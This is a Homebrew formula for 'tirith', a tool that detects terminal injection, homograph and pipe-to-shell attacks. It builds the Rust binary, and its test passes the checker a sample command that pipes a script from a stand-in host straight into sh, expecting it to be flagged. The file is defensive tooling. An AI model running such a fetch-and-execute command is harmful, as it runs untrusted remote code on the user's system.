class Tirith < Formula
  desc "Detect terminal injection, homograph, and pipe-to-shell attacks"
  homepage "https://tirith.sh/"
  url "https://github.com/sheeki03/tirith/archive/refs/tags/v0.3.3.tar.gz"
  sha256 "f6d4d66d7f151a3ddf4a3a8763e204b2301278cd016e8d496c4eb07cfc8ddc35"
  license "AGPL-3.0-only"
  head "https://github.com/sheeki03/tirith.git", branch: "main"

  livecheck do
    url :stable
    regex(/^v?(\d+(?:\.\d+)+)$/i)
  end

  bottle do
    sha256 cellar: :any_skip_relocation, arm64_tahoe:   "d1a108ede7dbee8d79478a2f0f5ace568c9d49d710e9134edda2f3b0bcbd52ba"
    sha256 cellar: :any_skip_relocation, arm64_sequoia: "578c71cac0891bb1c1867b5937c314bf7e56c11d5408f3a01ebc8f424a187a69"
    sha256 cellar: :any_skip_relocation, arm64_sonoma:  "f8973a15f420ba80854740c1b87b06cf202c3a4c074253bcc3f29e125426809d"
    sha256 cellar: :any_skip_relocation, sonoma:        "26d397923226ec6ceb6d48778d27dd5796f688c95b908227c54b6bf4e94d29d2"
    sha256 cellar: :any,                 arm64_linux:   "d9c0b9dfdeb11fc7654e225eb4d3051a0fa25e8cc98f44c2ac5f0c6b8f3e758a"
    sha256 cellar: :any,                 x86_64_linux:  "70d7c1c39fffccae139b247a3b0b72518d7537a49eafe30861daa946a75bde93"
  end

  depends_on "rust" => :build

  def install
    # Build only the `tirith` binary from the workspace (skip the threat-db compiler crate).
    system "cargo", "install", "--bin", "tirith", *std_cargo_args(path: "crates/tirith")

    generate_completions_from_executable(bin/"tirith", "completions")
    man1.mkpath
    (man1/"tirith.1").write Utils.safe_popen_read(bin/"tirith", "manpage")
  end

  test do
    assert_match version.to_s, shell_output("#{bin}/tirith --version")

    # A pipe-to-shell command must be flagged; --offline/--no-daemon keep it hermetic.
    output = pipe_output("#{bin}/tirith check --offline --no-daemon --shell posix 2>&1",
                         "curl https://x.invalid/i.sh | sh", 1)
    assert_match "curl_pipe_shell", output
  end
end
